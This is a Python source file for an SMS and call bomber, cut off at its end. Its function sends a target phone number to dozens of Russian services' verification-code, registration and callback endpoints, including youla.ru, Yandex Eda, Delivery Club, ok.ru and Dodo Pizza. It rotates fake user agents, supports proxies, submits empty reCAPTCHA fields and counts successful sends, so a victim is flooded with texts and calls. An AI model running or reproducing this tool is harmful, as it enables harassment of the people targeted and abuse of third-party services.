import requests
import json
import datetime

import bs
import random
from fake_useragent import UserAgent

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# https://stackoverflow.com/a/287944
class bcolors:
	HEADER = '\033[95m'
	OKBLUE = '\033[94m'
	OKCYAN = '\033[96m'
	OKGREEN = '\033[92m'
	WARNING = '\033[93m'
	FAIL = '\033[91m'
	ENDC = '\033[0m'
	BOLD = '\033[1m'
	UNDERLINE = '\033[4m'

# this mask idea is smart, props to FSystem88
def mask(raw_phone, phone_mask):

	if len(raw_phone) == phone_mask.count('#'):
		raw_phone_list = list(raw_phone)
		for i in raw_phone_list:
			phone_mask = phone_mask.replace("#", i, 1)
		return phone_mask
		print(phone_mask)

def send_sms(phone, name, surname, patronymic, latin_name, email, password, useragent, num = 1, proxies_o = '[БЕЗ ПРОКСИ]', proxies = None):
	phone9 = phone[1:]
	print(proxies)

	ua = UserAgent()
	header = { "User-Agent": ua.random, 
	'referer':'https://www.google.com/'
	}

	sms_cnt = 0

	try:
		# works
		try:
			r = requests.post("https://youla.ru/web-api/auth/request_code", data={"phone": phone}, 
				proxies=proxies, timeout=10, headers = header)

			if r:
				print(bcolors.OKGREEN + '[Отправлено с youla.ru]' + bcolors.WARNING)
				sms_cnt += 1

			r.raise_for_status()

		except requests.exceptions.Timeout as e:
			print('[Timeout exception]:', e)
		except requests.exceptions.TooManyRedirects as e:
			print('[Too many redirects]:', e)
		except requests.exceptions.RequestException as e:
			print('[Request Exception]:', e)
		except requests.exceptions.HTTPError as err:
			raise SystemExit(err)
		except Exception as e:
			print(e)

		# works
		try:
			masked_phone = mask(raw_phone = phone, phone_mask = "+# (###) ###-##-##")
			r = requests.post("https://yaponchik.net/login/login_.php",

			data = {"login": "Y","countdown": "0", "step": "phone",
			"redirect": "/profile/", "phone": masked_phone}, 
			proxies=proxies, timeout=10, headers = header)

			if r:

				print(bcolors.OKGREEN + '[Отправлено с yaponchik.net]' + bcolors.WARNING)
				sms_cnt += 1

			r.raise_for_status()

		except requests.exceptions.Timeout as e:
			print('[Timeout exception]:', e)
		except requests.exceptions.TooManyRedirects as e:
			print('[Too many redirects]:', e)
		except requests.exceptions.RequestException as e:
			print('[Request Exception]:', e)
		except requests.exceptions.HTTPError as err:
			raise SystemExit(err)
		except Exception as e:
			print(e)

		# works
		try:
			r = requests.post("https://eda.yandex/api/v1/user/request_authentication_code", 
				json={"phone_number": "+" + phone}, 
				proxies=proxies, timeout=10, headers = header)

			if r:

				print(bcolors.OKGREEN + '[Отправлено с Яндекс.Еды]' + bcolors.WARNING)
				sms_cnt += 1

			r.raise_for_status()

		except requests.exceptions.Timeout as e:
			print('[Timeout exception]:', e)
		except requests.exceptions.TooManyRedirects as e:
			print('[Too many redirects]:', e)
		except requests.exceptions.RequestException as e:
			print('[Request Exception]:', e)
		except requests.exceptions.HTTPError as err:
			raise SystemExit(err)
		except Exception as e:
			print(e)

		# works
		try:
			r = requests.post("https://api.iconjob.co/api/auth/verification_code",
				json={"phone": phone}, proxies=proxies, timeout=10, headers = header)

			if r:
				print(bcolors.OKGREEN + '[Отправлено с vkrabota.ru]' + bcolors.WARNING)
				sms_cnt += 1

			r.raise_for_status()

		except requests.exceptions.Timeout as e:
			print('[Timeout exception]:', e)
		except requests.exceptions.TooManyRedirects as e:
			print('[Too many redirects]:', e)
		except requests.exceptions.RequestException as e:
			print('[Request Exception]:', e)
		except requests.exceptions.HTTPError as err:
			raise SystemExit(err)
		except Exception as e:
			print(e)

		# works
		try:
			r = requests.post("https://shop.vsk.ru/ajax/auth/postSms/", 
				data={"phone": phone}, proxies=proxies, timeout=10, headers = header)

			if r:
				print(bcolors.OKGREEN + '[Отправлено с shop.vsk.ru]' + bcolors.WARNING)
				sms_cnt += 1

			r.raise_for_status()

		except requests.exceptions.Timeout as e:
			print('[Timeout exception]:', e)
		except requests.exceptions.TooManyRedirects as e:
			print('[Too many redirects]:', e)
		except requests.exceptions.RequestException as e:
			print('[Request Exception]:', e)
		except requests.exceptions.HTTPError as err:
			raise SystemExit(err)
		except Exception as e:
			print(e)

		# works
		try:
			r = requests.post("https://b.utair.ru/api/v1/login/", 
				json={"login": phone, "confirmation_type": "call_code"}, 
				proxies=proxies, timeout=10, headers = header)

			if r:
				print(bcolors.OKGREEN + '[Вызываем с utair.ru]' + bcolors.WARNING)
				sms_cnt += 1

			r.raise_for_status()

		except requests.exceptions.Timeout as e:
			print('[Timeout exception]:', e)
		except requests.exceptions.TooManyRedirects as e:
			print('[Too many redirects]:', e)
		except requests.exceptions.RequestException as e:
			print('[Request Exception]:', e)
		except requests.exceptions.HTTPError as err:
			raise SystemExit(err)
		except Exception as e:
			print(e)

		# works
		try:
			r = requests.post("https://api.delivery-club.ru/api1.2/user/otp", 
				data={"phone": phone, "newotp": "1"}, 
				proxies=proxies, timeout=10, headers = header)

			if r:
				print(bcolors.OKGREEN + '[Отправлено с Delivery Club]' + bcolors.WARNING)
				sms_cnt += 1

			r.raise_for_status()
			
		except requests.exceptions.Timeout as e:
			print('[Timeout exception]:', e)
		except requests.exceptions.TooManyRedirects as e:
			print('[Too many redirects]:', e)
		except requests.exceptions.RequestException as e:
			print('[Request Exception]:', e)
		except requests.exceptions.HTTPError as err:
			raise SystemExit(err)
		except Exception as e:
			print(e)

		# works
		try:
			r = requests.post("https://api.sunlight.net/v3/customers/authorization/",data={"phone": phone}, 
				proxies=proxies, timeout=10, headers = header)

			if r:
				print(bcolors.OKGREEN + '[Отправлено с SUNLIGHT]' + bcolors.WARNING)
				sms_cnt += 1

			r.raise_for_status()

		except requests.exceptions.Timeout as e:
			print('[Timeout exception]:', e)
		except requests.exceptions.TooManyRedirects as e:
			print('[Too many redirects]:', e)
		except requests.exceptions.RequestException as e:
			print('[Request Exception]:', e)
		except requests.exceptions.HTTPError as err:
			raise SystemExit(err)
		except Exception as e:
			print(e)

		# works
		try:
			r = requests.post("https://rutaxi.ru/ajax_auth.html", data={"l": phone9, "c": "3"}, 
				proxies=proxies, timeout=10, headers = header)

			if r:
				print(bcolors.OKGREEN + '[Отправлено с Rutaxi.ru]' + bcolors.WARNING)
				sms_cnt += 1

			r.raise_for_status()

		except requests.exceptions.Timeout as e:
			print('[Timeout exception]:', e)
		except requests.exceptions.TooManyRedirects as e:
			print('[Too many redirects]:', e)
		except requests.exceptions.RequestException as e:
			print('[Request Exception]:', e)
		except requests.exceptions.HTTPError as err:
			raise SystemExit(err)
		except Exception as e:
			print(e)

		# works
		try:
			r = requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
				data={"st.r.phone": "+" + phone}, proxies=proxies, timeout=10, headers = header)

			if r:
				print(bcolors.OKGREEN + '[Отправлено с ok.ru]' + bcolors.WARNING)
				sms_cnt += 1

			r.raise_for_status()

		except requests.exceptions.Timeout as e:
			print('[Timeout exception]:', e)
		except requests.exceptions.TooManyRedirects as e:
			print('[Too many redirects]:', e)
		except requests.exceptions.RequestException as e:
			print('[Request Exception]:', e)
		except requests.exceptions.HTTPError as err:
			raise SystemExit(err)
		except Exception as e:
			print(e)

		# works
		try:
			r = requests.post("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code", 
				params={"msisdn": phone}, proxies=proxies, timeout=10, headers = header)

			if r:
				print(bcolors.OKGREEN + '[Отправлено с MTS TV]' + bcolors.WARNING)
				sms_cnt += 1

			r.raise_for_status()

		except requests.exceptions.Timeout as e:
			print('[Timeout exception]:', e)
		except requests.exceptions.TooManyRedirects as e:
			print('[Too many redirects]:', e)
		except requests.exceptions.RequestException as e:
			print('[Request Exception]:', e)
		except requests.exceptions.HTTPError as err:
			raise SystemExit(err)
		except Exception as e:
			print(e)

		# works
		try:
			r = requests.post("https://my.modulbank.ru/api/v2/auth/phone",
				json={"CellPhone": phone9}, proxies=proxies, timeout=10, headers = header)

			if r:
				print(bcolors.OKGREEN + '[Отправлено с Modulbank]' + bcolors.WARNING)
				sms_cnt += 1

			r.raise_for_status()

		except requests.exceptions.Timeout as e:
			print('[Timeout exception]:', e)
		except requests.exceptions.TooManyRedirects as e:
			print('[Too many redirects]:', e)
		except requests.exceptions.RequestException as e:
			print('[Request Exception]:', e)
		except requests.exceptions.HTTPError as err:
			raise SystemExit(err)
		except Exception as e:
			print(e)

		# works
		try:
			masked_phone = mask(raw_phone=phone, phone_mask="+# (###) ### ## ##")
			r = requests.post("http://mnogomenu.ru/ajax/callback/send", 
				json = {"uname": name, "uphone": masked_phone}, proxies=proxies, timeout=10, headers = header)

			if r:
				print(bcolors.OKGREEN + '[Оставили заявку на Mnogomenu под именем {}.]'.format(name) + bcolors.WARNING)
				sms_cnt += 1

			r.raise_for_status()

		except requests.exceptions.Timeout as e:
			print('[Timeout exception]:', e)
		except requests.exceptions.TooManyRedirects as e:
			print('[Too many redirects]:', e)
		except requests.exceptions.RequestException as e:
			print('[Request Exception]:', e)
		except requests.exceptions.HTTPError as err:
			raise SystemExit(err)
		except Exception as e:
			print(e)

		# works
		try:
			r = requests.post("https://lenta.com/api/v1/registration/requestValidationCode",
				json={"phone": phone}, proxies=proxies, timeout=10, headers = header)

			if r:
				print(bcolors.OKGREEN + '[Отправлено с Ленты]' + bcolors.WARNING)
				sms_cnt += 1

			r.raise_for_status()
		except requests.exceptions.Timeout as e:
			print('[Timeout exception]:', e)
		except requests.exceptions.TooManyRedirects as e:
			print('[Too many redirects]:', e)
		except requests.exceptions.RequestException as e:
			print('[Request Exception]:', e)
		except requests.exceptions.HTTPError as err:
			raise SystemExit(err)
		except Exception as e:
			print(e)

		# works
		try:
			r = requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php",
				data={"msisdn": phone,"locale": "en","countryCode": "ru",
				"version": "1","k": "ic1rtwz1s1Hj1O0r","r": "46763"}, proxies=proxies, timeout=10, headers = header)

			if r:
				print(bcolors.OKGREEN + '[Отправлено с ICQ]' + bcolors.WARNING)
				sms_cnt += 1

			r.raise_for_status()

		except requests.exceptions.Timeout as e:
			print('[Timeout exception]:', e)
		except requests.exceptions.TooManyRedirects as e:
			print('[Too many redirects]:', e)
		except requests.exceptions.RequestException as e:
			print('[Request Exception]:', e)
		except requests.exceptions.HTTPError as err:
			raise SystemExit(err)
		except Exception as e:
			print(e)

		# works
		try:
			masked_phone = mask(raw_phone = phone, phone_mask = "+# (###) ###-##-##")

			r = requests.post("https://www.hatimaki.ru/register/",data={"REGISTER[LOGIN]": phone,
				"REGISTER[PERSONAL_PHONE]": masked_phone, "REGISTER[SMS_CODE]": "","resend-sms": "1",
				"REGISTER[EMAIL]": "","register_submit_button": "Зарегистрироваться"}, 
				proxies=proxies, timeout=10, headers = header)

			if r:
				print(bcolors.OKGREEN + '[Отправлено с hatimaki.ru]' + bcolors.WARNING)
				sms_cnt += 1

			r.raise_for_status()

		except requests.exceptions.Timeout as e:
			print('[Timeout exception]:', e)
		except requests.exceptions.TooManyRedirects as e:
			print('[Too many redirects]:', e)
		except requests.exceptions.RequestException as e:
			print('[Request Exception]:', e)
		except requests.exceptions.HTTPError as err:
			raise SystemExit(err)
		except Exception as e:
			print(e)

		# works
		try:
			masked_phone = mask(raw_phone=phone, phone_mask="+# (###) ###-##-##")
			r = requests.post("https://foodband.ru/api?call=calls", data={"customerName": name,
				"phone": masked_phone,"g-recaptcha-response": ""}, proxies=proxies, timeout=10, headers = header)

			if r:
				print(bcolors.OKGREEN + '[Вызываем с Foodband]' + bcolors.WARNING)
				sms_cnt += 1

			r.raise_for_status()

		except requests.exceptions.Timeout as e:
			print('[Timeout exception]:', e)
		except requests.exceptions.TooManyRedirects as e:
			print('[Too many redirects]:', e)
		except requests.exceptions.RequestException as e:
			print('[Request Exception]:', e)
		except requests.exceptions.HTTPError as err:
			raise SystemExit(err)
		except Exception as e:
			print(e)

		# works
		try:
			r = requests.get("https://foodband.ru/api/", params={"call": "customers/sendVerificationCode",
				"phone": phone9,"g-recaptcha-response": ""}, proxies=proxies, timeout=10, headers = header)

			if r:
				print(bcolors.OKGREEN + '[Отправлено с Foodband]' + bcolors.WARNING)
				sms_cnt += 1

			r.raise_for_status()

		except requests.exceptions.Timeout as e:
			print('[Timeout exception]:', e)
		except requests.exceptions.TooManyRedirects as e:
			print('[Too many redirects]:', e)
		except requests.exceptions.RequestException as e:
			print('[Request Exception]:', e)
		except requests.exceptions.HTTPError as err:
			raise SystemExit(err)
		except Exception as e:
			print(e)

		# somewhat works
		try:
			r = requests.post("https://api.delitime.ru/api/v2/signup",
				data={"SignupForm[username]": phone, "SignupForm[device_type]": 3}, 
				proxies=proxies, timeout=10, headers = header)

			if r:
				print(bcolors.OKGREEN + '[Отправлено с Делимобиль]' + bcolors.WARNING)
				sms_cnt += 1

			r.raise_for_status()

		except requests.exceptions.Timeout as e:
			print('[Timeout exception]:', e)
		except requests.exceptions.TooManyRedirects as e:
			print('[Too many redirects]:', e)
		except requests.exceptions.RequestException as e:
			print('[Request Exception]:', e)
		except requests.exceptions.HTTPError as err:
			raise SystemExit(err)
		except Exception as e:
			print(e)

		# works
		try:
			masked_phone = mask(raw_phone=phone, phone_mask="+# (###) ###-##-##")

			r = requests.post("https://api.creditter.ru/confirm/sms/send",
				json={"phone": masked_phone, "type": "register"}, proxies=proxies, timeout=10, headers = header)

			if r:
				print(bcolors.OKGREEN + '[Отправлено с creditter.ru]' + bcolors.WARNING)
				sms_cnt += 1

			r.raise_for_status()

		except requests.exceptions.Timeout as e:
			print('[Timeout exception]:', e)
		except requests.exceptions.TooManyRedirects as e:
			print('[Too many redirects]:', e)
		except requests.exceptions.RequestException as e:
			print('[Request Exception]:', e)
		except requests.exceptions.HTTPError as err:
			raise SystemExit(err)
		except Exception as e:
			print(e)

		# somewhat works
		try:
			r = requests.post(f"https://www.citilink.ru/registration/confirm/phone/+{phone}/", 
				data={}, proxies=proxies, timeout=10, headers = header)

			if r:
				print(bcolors.OKGREEN + '[Отправлено с citilink.ru]' + bcolors.WARNING)
				sms_cnt += 1

			r.raise_for_status()

		except requests.exceptions.Timeout as e:
			print('[Timeout exception]:', e)
		except requests.exceptions.TooManyRedirects as e:
			print('[Too many redirects]:', e)
		except requests.exceptions.RequestException as e:
			print('[Request Exception]:', e)
		except requests.exceptions.HTTPError as err:
			raise SystemExit(err)
		except Exception as e:
			print(e)

		# works
		try:
			masked_phone = mask(raw_phone=phone9, phone_mask="(###) ###-##-##")
			r = requests.get("https://avtobzvon.ru/request/makeTestCall",params={"to": masked_phone}, 
				proxies=proxies, timeout=10, headers = header)

			if r:
				print(bcolors.OKGREEN + '[Вызываем с avtobzvon.ru]' + bcolors.WARNING)
				sms_cnt += 1

			r.raise_for_status()

		except requests.exceptions.Timeout as e:
			print('[Timeout exception]:', e)
		except requests.exceptions.TooManyRedirects as e:
			print('[Too many redirects]:', e)
		except requests.exceptions.RequestException as e:
			print('[Request Exception]:', e)
		except requests.exceptions.HTTPError as err:
			raise SystemExit(err)
		except Exception as e:
			print(e)

		# somewhat works
		try:
			masked_phone = mask(raw_phone=phone, phone_mask="+# (###) ###-##-##")

			r = requests.post("https://api.apteka.ru/Auth/Auth_Code",
				json ={"phone": masked_phone, "cityId": "5e57803249af4c0001d64407"}, 
				proxies=proxies, timeout=10, headers = header)

			if r:
				print(bcolors.OKGREEN + '[Отправлено с apteka.ru]' + bcolors.WARNING)
				sms_cnt += 1

			r.raise_for_status()

		except requests.exceptions.Timeout as e:
			print('[Timeout exception]:', e)
		except requests.exceptions.TooManyRedirects as e:
			print('[Too many redirects]:', e)
		except requests.exceptions.RequestException as e:
			print('[Request Exception]:', e)
		except requests.exceptions.HTTPError as err:
			raise SystemExit(err)
		except Exception as e:
			print(e)


		# somewhat works
		try:
			r = requests.post('https://dodopizza.ru/api/sendconfirmationcode', data = {"phoneNumber": phone}, 
				headers = header, proxies=proxies, timeout=10)

			if r:
				print(bcolors.OKGREEN + '[Отправлено с Додо Пиццы]' + bcolors.WARNING)
				sms_cnt += 1

			r.raise_for_status()

		except requests.exceptions.Timeout as e:
			print('[Timeout exception]:', e)
		except requests.exceptions.TooManyRedirects as e:
			print('[Too many redirects]:', e)
		except requests.exceptions.RequestException as e:
			print('[Request Exception]:', e)
		except requests.exceptions.HTTPError as err:
			raise SystemExit(err)
		except Exception as e:
			print(e)

		# somewhat works
		try:
			masked_phone = mask(raw_phone = phone, phone_mask=" #(###)###-##-##")
			r = requests.post('https://elize.ru/ajaxLib/codeSend.php', data = {"phone": masked_phone,"action": 1}, 
				headers = header, proxies=proxies, timeout=10)

			if r:
				print(bcolors.OKGREEN + '[Отправлено с elize.ru]' + bcolors.WARNING)
				sms_cnt += 1

			r.raise_for_status()

		except requests.exceptions.Timeout as e:
			print('[Timeout exception]:', e)
		except requests.exceptions.TooManyRedirects as e:
			print('[Too many redirects]:', e)
		except requests.exceptions.RequestException as e:
			print('[Request Exception]:', e)
		except requests.exceptions.HTTPError as err:
			raise SystemExit(err)
		except Exception as e:
			print(e)


		# works
		try:
			r = requests.post('https://api.delivery-club.ru/api1.2/user/otp', data = {"phone": phone, "newotp": "1"},
				headers = header, proxies=proxies, timeout=10)

			if r:
				print(bcolors.OKGREEN + '[Отправлено с Delivery Club]' + bcolors.WARNING)
				sms_cnt += 1

			r.raise_for_status()

		except requests.exceptions.Timeout as e:
			print('[Timeout exception]:', e)
		except requests.exceptions.TooManyRedirects as e:
			print('[Too many redirects]:', e)
		except requests.exceptions.RequestException as e:
			print('[Request Exception]:', e)
		except requests.exceptions.HTTPError as err:
			raise SystemExit(err)
		except Exception as e:
			print(e)

		# works
		try:
			r = requests.post('https://lavka.yandex.ru/api/v1/user/request_authentication_code', 
				json = {"phone_number": "+" + phone}, headers = header, proxies=proxies, timeout=10)

			if r:
				print(bcolors.OKGREEN + '[Отправлено с Яндекс.Лавка]' + bcolors.WARNING)
				sms_cnt += 1

			r.raise_for_status()

		except requests.exceptions.Timeout as e:
			print('[Timeout exception]:', e)
		except requests.exceptions.TooManyRedirects as e:
			print('[Too many redirects]:', e)
		except requests.exceptions.RequestException as e:
			print('[Request Exception]:', e)
		except requests.exceptions.HTTPError as err:
			raise SystemExit(err)
		except Exception as e:
			print(e)

		# works

		try:
			r = requests.post('https://goldapple.ru/rest/V1/customer/registration/start', 
			json = {"country_code": "RU", "phone": phone}, headers = header, proxies=proxies, timeout=10)

			if r:
				print(bcolors.OKGREEN + '[Отправлено с GOLDAPPLE]' + bcolors.WARNING)
				sms_cnt += 1

			r.raise_for_status()

		except requests.exceptions.Timeout as e:
			print('[Timeout exception]:', e)
		except requests.exceptions.TooManyRedirects as e:
			print('[Too many redirects]:', e)
		except requests.exceptions.RequestException as e:
			print('[Request Exception]:', e)
		except requests.exceptions.HTTPError as err:
			raise SystemExit(err)
		except Exception as e:
			print(e)

		# works
		try:
			r = requests.post('https://api.ddsgt.ru/api/auth/send-code', json = {"phone": phone}, 
			headers = header, proxies=proxies, timeout=10)

			if r:
				print(bcolors.OKGREEN + '[Отправлено с ddsgt.ru]' + bcolors.WARNING)
				sms_cnt += 1

			r.raise_for_status()

		except requests.exceptions.Timeout as e:
			print('[Timeout exception]:', e)
		except requests.exceptions.TooManyRedirects as e:
			print('[Too many redirects]:', e)
		except requests.exceptions.RequestException as e:
			print('[Request Exception]:', e)
		except requests.exceptions.HTTPError as err:
			raise SystemExit(err)
		except Exception as e:
			print(e)

		# works sometimes
		try:
			r = requests.post('https://api.credit7.ru/user/change-password', json = {"value": phone}, 
			headers = header, proxies=proxies, timeout=10)

			if r:
				print(bcolors.OKGREEN + '[Отправлено с credit7.ru]' + bcolors.WARNING)
				sms_cnt += 1

			r.raise_for_status()

		except requests.exceptions.Timeout as e:
			print('[Timeout exception]:', e)
		except requests.exceptions.TooManyRedirects as e:
			print('[Too many redirects]:', e)
		except requests.exceptions.RequestException as e:
			print('[Request Exception]:', e)
		except requests.exceptions.HTTPError as err:
			raise SystemExit(err)
		except Exception as e:
			print(e)

		# works sometimes
		try:
			masked_phone = mask(raw_phone = phone,  phone_mask="+# (###) ###-##-##")

			r = requests.post('https://www.eapteka.ru/api/v3/user', 
				json = {"phone": masked_phone, "force_sms": True}, 
				headers = header, timeout=10)

			if r:
				print(bcolors.OKGREEN + '[Отправлено с EAPTEKA]' + bcolors.WARNING)
				sms_cnt += 1

			r.raise_for_status()

		except requests.exceptions.Timeout as e:
			print('[Timeout exception]:', e)
		except requests.exceptions.TooManyRedirects as e:
			print('[Too many redirects]:', e)
		except requests.exceptions.RequestException as e:
			print('[Request Exception]:', e)
		except requests.exceptions.HTTPError as err:
			raise SystemExit(err)
		except Exception as e:
			print(e)

		# vernyi, works but too much traffic
		try:
			r = requests.post('https://loymax.ivoin.ru/publicapi/v1.2/Registration/BeginRegistration', 
				json = {"password":"", "login":phone},
			headers = header, proxies=proxies, timeout=10)

			if r:
				print(bcolors.OKGREEN + '[Отправлено с Верный]' + bcolors.WARNING)
				sms_cnt += 1

			r.raise_for_status()

		except requests.exceptions.Timeout as e:
			print('[Timeout exception]:', e)
		except requests.exceptions.TooManyRedirects as e:
			print('[Too many redirects]:', e)
		except requests.exceptions.RequestException as e:
			print('[Request Exception]:', e)
		except requests.exceptions.HTTPError as err:
			raise SystemExit(err)
		except Exception as e:
			print(e)

		# works
		try:
			masked_phone = mask(raw_phone = phone, phone_mask = "+# ### ###-##-##")

			r = requests.post('https://moscow.dealcity.ru/auth/register', 
			data = {"phone": masked_phone, "cityId" : "5", "code": "", "password": ""}, 
			headers = header, timeout=10)

			if r:
				print(bcolors.OKGREEN + '[Отправлено с moscow.dealcity.ru]' + bcolors.WARNING)
				sms_cnt += 1

			r.raise_for_status()

		except requests.exceptions.Timeout as e:
			print('[Timeout exception]:', e)
		except requests.exceptions.TooManyRedirects as e:
			print('[Too many redirects]:', e)
		except requests.exceptions.RequestException as e:
			print('[Request Exception]:', e)
		except requests.exceptions.HTTPError as err:
			raise SystemExit(err)
		except Exception as e:
			print(e)

		# works
		try:
			r = requests.post('https://newjacofood.ru/src/php/route.php', 
			data = {"type": "get_login", "data[login]": "8" + phone9, "uri": "/togliatti/"}, 
			headers = header, proxies=proxies, timeout=10)

			if r:
				print(bcolors.OKGREEN + '[Отправлено с jacofood.ru]' + bcolors.WARNING)
				sms_cnt += 1

			r.raise_for_status()

		except requests.exceptions.Timeout as e:
			print('[Timeout exception]:', e)
		except requests.exceptions.TooManyRedirects as e:
			print('[Too many redirects]:', e)
		except requests.exceptions.RequestException as e:
			print('[Request Exception]:', e)
		except requests.exceptions.HTTPError as err:
			raise SystemExit(err)
		except Exception as e:
			print(e)

		# works
		try:
			r = requests.get('https://webmaster.leads.su/admin/register', 
			params = {"action": "sms", "phone": "+" + phone, "code": "", "method": "send"}, 
			headers = header, proxies=proxies, timeout=10)

			if r:
				print(bcolors.OKGREEN + '[Отправлено с leads.su]' + bcolors.WARNING)
				sms_cnt += 1

			r.raise_for_status()

		except requests.exceptions.Timeout as e:
			print('[Timeout exception]:', e)
		except requests.exceptions.TooManyRedirects as e:
			print('[Too many redirects]:', e)
		except requests.exceptions.RequestException as e:
			print('[Request Exception]:', e)
		except requests.exceptions.HTTPError as err:
			raise SystemExit(err)
		except Exception as e:
			print(e)

		# works
		try:
			masked_phone = mask(raw_phone = phone, phone_mask = "+# (###) ###-####")

			r = requests.post('https://taxovichkof.ru/user/register', 
			data = {"Users[username]" : masked_phone}, 
			headers = header, proxies=proxies, timeout=10)

			if r:
				print(bcolors.OKGREEN + '[Отправлено с taxovichkof.ru]' + bcolors.WARNING)
				sms_cnt += 1

			r.raise_for_status()
		except requests.exceptions.Timeout as e:
			print('[Timeout exception]:', e)
		except requests.exceptions.TooManyRedirects as e:
			print('[Too many redirects]:', e)
		except requests.exceptions.RequestException as e:
			print('[Request Exception]:', e)
		except requests.exceptions.HTTPError as err:
			raise SystemExit(err)
		except Exception as e:
			print(e)

		# works
		try:
			r = requests.post("https://sephora.ru/",

			data = {"s_login": phone9, "m_mail": email, "s_pass": password, "b_accept_privacy_policy": "1", 
			"submit_register": "1", "s_action": "code_confirm_send"}, 
			timeout=10, proxies = proxies, headers = header)

			if r:
				print(bcolors.OKGREEN + '[Отправлено с sephora.ru]' + bcolors.WARNING)
				sms_cnt += 1

			r.raise_for_status()

		except requests.exceptions.Timeout as e:
			print('[Timeout exception]:', e)
		except requests.exceptions.TooManyRedirects as e:
			print('[Too many redirects]:', e)
		except requests.exceptions.RequestException as e:
			print('[Request Exception]:', e)
		except requests.exceptions.HTTPError as err:
			raise SystemExit(err)
		except Exception as e:
			print(e)

		# somewhat works
		try:
			masked_phone = mask(raw_phone = phone, phone_mask = "+# (###) ###-##-##")
			r = requests.post("https://msk.rbt.ru/user/sendCode/",

			data = {"phone": masked_phone}, proxies = proxies, timeout=10, headers = header)

			if r:
				print(bcolors.OKGREEN +'[Отправлено с rbt.ru]' + bcolors.WARNING)
				sms_cnt += 1

			r.raise_for_status()

		except requests.exceptions.Timeout as e:
			print('[Timeout exception]:', e)
		except requests.exceptions.TooManyRedirects as e:
			print('[Too many redirects]:', e)
		except requests.exceptions.RequestException as e:
			print('[Request Exception]:', e)
		except requests.exceptions.HTTPError as err:
			raise SystemExit(err)
		except Exception as e:
			print(e)

		try:
			masked_phone = mask(raw_phone = phone, phone_mask = "+# (###) ###-##-##")
			r = requests.post("https://burgerking.ru/middleware/bridge/api/v3/auth/signup",

			json = {"phone": phone, "invite": ""})

			if r:
				print(bcolors.OKGREEN +'[Отправлено с burgerking]' + bcolors.WARNING)
				sms_cnt += 1

			r.raise_for_status()

		except requests.exceptions.Timeout as e:
			print('[Timeout exception]:', e)
		except requests.exceptions.TooManyRedirects as e:
			print('[Too many redirects]:', e)
		except requests.exceptions.RequestException as e:
			print('[Request Exception]:', e)
		except requests.exceptions.HTTPError as err:
			raise SystemExit(err)
		except Exception as e:
			print(e)

		# works
		try:
			r = requests.get("https://findclone.ru/register",

			params = {"phone": " " + phone}, headers = header, timeout=10)

			if r:
				print(bcolors.OKGREEN + '[Вызываем с findclone.ru]' + bcolors.WARNING)
				sms_cnt += 1

			r.raise_for_status()

		except requests.exceptions.Timeout as e:
			print('[Timeout exception]:', e)
		except requests.exceptions.TooManyRedirects as e:
			print('[Too many redirects]:', e)
		except requests.exceptions.RequestException as e:
			print('[Request Exception]:', e)

		except requests.exceptions.HTTPError as err:
			raise SystemExit(err)
		except Exception as e:
			print(e)

		# works
		try:
			masked_phone = mask(raw_phone = phone, phone_mask = "+#(###)###-##-##")
			r = requests.post("https://www.remontnik.ru/api/v1/profile/confirm/phone",

			json = {"phone": phone}, headers = header, timeout=10)

			if r:
				print(bcolors.OKGREEN + '[Отправлено с remontnik.ru]' + bcolors.WARNING)
				sms_cnt += 1

			r.raise_for_status()

		except requests.exceptions.Timeout as e:
			print('[Timeout exception]:', e)
		except requests.exceptions.TooManyRedirects as e:
			print('[Too many redirects]:', e)
		except requests.exceptions.RequestException as e:
			print('[Request Exception]:', e)
		except requests.exceptions.HTTPError as err:
			raise SystemExit(err)
		except Exception as e:
			print(e)

		# works
		try:

			r = requests.post("https://uteka.ru/rpc/", 
			json = {"jsonrpc":"2.0", "id":2, "method":"auth.GetCode", 
			"params":{"phone":phone9, "mustExist":False, "sendRealSms":True}}, 
			params = {'method': 'auth.GetCode'},
			timeout = 10, headers = header, proxies = proxies)

			if r:

				print(bcolors.OKGREEN + '[Отправлено с uteka.ru]' + bcolors.WARNING)
				sms_cnt += 1

			r.raise_for_status()

		except requests.exceptions.Timeout as e:
			print('[Timeout exception]:', e)
		except requests.exceptions.TooManyRedirects as e:
			print('[Too many redirects]:', e)
		except requests.exceptions.RequestException as e:
			print('[Request Exception]:', e)
		except requests.exceptions.HTTPError as err:
			raise SystemExit(err)
		except Exception as e:
			print(e)

		# works
		try:

			r = requests.post("https://units.bz/auth", 
			data = {'act': 'up', 'phone': phone},
			timeout = 10, headers = header, proxies=proxies)

			if r:

				print(bcolors.OKGREEN + '[Отправлено с unitz.bz]' + bcolors.WARNING)
				sms_cnt += 1

			r.raise_for_status()

		except requests.exceptions.Timeout as e:
			print('[Timeout exception]:', e)
		except requests.exceptions.TooManyRedirects as e:
			print('[Too many redirects]:', e)
		except requests.exceptions.RequestException as e:
			print('[Request Exception]:', e)
		except requests.exceptions.HTTPError as err:
			raise SystemExit(err)
		except Exception as e:
			print(e)

		# works
		try:

			r = requests.post("https://yapoki.ru/local/templates/main/components/bitrix/system.auth.registration/flat/sms.php", 
			data = {"SMS_PHONE": phone},
			timeout = 10, headers = header, verify = False)

			if r:

				print(bcolors.OKGREEN + '[Отправлено с yapoki.ru]' + bcolors.WARNING)
				sms_cnt += 1

			r.raise_for_status()

		except requests.exceptions.Timeout as e:
			print('[Timeout exception]:', e)
		except requests.exceptions.TooManyRedirects as e:
			print('[Too many redirects]:', e)
		except requests.exceptions.RequestException as e:
			print('[Request Exception]:', e)
		except requests.exceptions.HTTPError as err:
			raise SystemExit(err)
		except Exception as e:
			print(e)

		# works
		try:

			header = {
			'Accept': '*/*',
			'Accept-Encoding': 'gzip, deflate, br',
			'Accept-Language': 'en-US,en;q=0.9',
			'Connection': 'keep-alive',
			'Content-Length': '229',
			'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
			'Host': 'www.mymajor.ru',
			'Origin': 'https://www.mymajor.ru',
			'Referer': 'https://www.mymajor.ru/',
			'sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"',
			'sec-ch-ua-mobile': '?0',
			'Sec-Fetch-Dest': 'empty',
			'Sec-Fetch-Mode': 'cors',
			'Sec-Fetch-Site': 'same-origin',
